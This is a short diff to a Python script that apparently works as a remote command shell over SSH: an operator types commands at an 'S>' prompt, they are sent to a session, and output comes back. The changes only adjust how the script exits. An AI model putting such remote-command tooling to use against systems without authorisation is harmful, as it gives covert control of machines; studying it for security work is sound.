@@ -62,14 +62,14 @@ def process_commands():
     command = input("S> ").strip()
     if command == "exit":
         server_session.send(command)
-        return
+        exit_server_session()
+        sys.exit()
     elif command.split(" ")[0] == "interact":
         server_session.send(command)
         interact()
     else:
         server_session.send(command)
         print(server_session.recv(1024).decode('utf-8'))
-
 
 #connect to the remote ssh server and recieve commands to be #executed and send back output
 def ssh_command(server_address, server_port, username, password):
@@ -93,7 +93,6 @@ def ssh_command(server_address, server_port, username, password):
         #wait for command, execute and send result ouput
         process_commands()
     exit_server_session()
-    return
 
 try:
     ssh_command(server_address, server_port, username, password)
